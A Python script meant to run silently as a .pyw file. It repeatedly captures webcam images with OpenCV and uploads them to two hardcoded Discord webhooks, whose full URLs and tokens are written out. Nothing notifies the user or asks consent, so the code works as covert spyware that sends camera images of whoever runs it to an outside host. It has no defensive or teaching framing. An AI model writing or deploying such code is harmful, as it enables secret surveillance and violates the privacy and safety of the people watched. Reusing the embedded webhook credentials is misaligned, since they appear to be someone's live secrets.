
# Save this as: camera_auto.pyw (for silent background operation)
import cv2
import requests
import time
from datetime import datetime
import sys
import os

# Discord webhooks
DISCORD_WEBHOOKS = [
    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
]

# Settings
CAPTURE_INTERVAL = 60  # Seconds between captures (adjust as needed)
MAX_FAILURES = 5  # Stop after this many failures

def log_message(message):
    """Log message to file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    
    # Write to log file
    try:
        with open("camera_log.txt", "a", encoding="utf-8") as f:
            f.write(log_entry)
    except:
        pass

def capture_image():
    """Quick image capture."""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        
        # Quick capture
        time.sleep(0.1)  # Small delay for camera to initialize
        ret, frame = cap.read()
        cap.release()
        
        return frame if ret else None
    except:
        return None

def send_to_discord(image, webhook_url, message=""):
    """Send to Discord."""
    try:
        _, buffer = cv2.imencode('.jpg', image)
        files = {'file': ('capture.jpg', buffer.tobytes(), 'image/jpeg')}
        data = {'content': message} if message else {}
        
        response = requests.post(webhook_url, files=files, data=data, timeout=15)
        return response.status_code == 204
    except:
        return False

def main_loop():
    """Main continuous loop."""
    log_message("Camera bot started")
    failure_count = 0
    
    while failure_count < MAX_FAILURES:
        try:
            # Capture image
            image = capture_image()
            
            if image is None:
                failure_count += 1
                log_message(f"Capture failed ({failure_count}/{MAX_FAILURES})")
                time.sleep(10)
                continue
            
            # Reset failure count on success
            failure_count = 0
            
            # Send to Discord
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"Auto capture at {timestamp}"
            
            successes = 0
            for webhook in DISCORD_WEBHOOKS:
                if send_to_discord(image, webhook, message):
                    successes += 1
                time.sleep(1)  # Delay between webhooks
            
            log_message(f"Sent {successes}/{len(DISCORD_WEBHOOKS)} webhooks")
            
            # Wait for next capture
            for _ in range(CAPTURE_INTERVAL):
                time.sleep(1)
                
        except KeyboardInterrupt:
            log_message("Stopped by user")
            break
        except Exception as e:
            failure_count += 1
            log_message(f"Error: {str(e)[:50]}")
            time.sleep(10)
    
    log_message(f"Stopped after {MAX_FAILURES} failures")

# Single capture version (for your launcher)
def single_capture():
    """Single capture mode for launcher."""
    try:
        image = capture_image()
        if image is None:
            return False
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"Capture at {timestamp}"
        
        for webhook in DISCORD_WEBHOOKS:
            send_to_discord(image, webhook, message)
            time.sleep(1)
        
        return True
    except:
        return False

if __name__ == "__main__":
    # Run single capture for launcher (non-interactive)
    if single_capture():
        sys.exit(0)
    else:
        sys.exit(1)
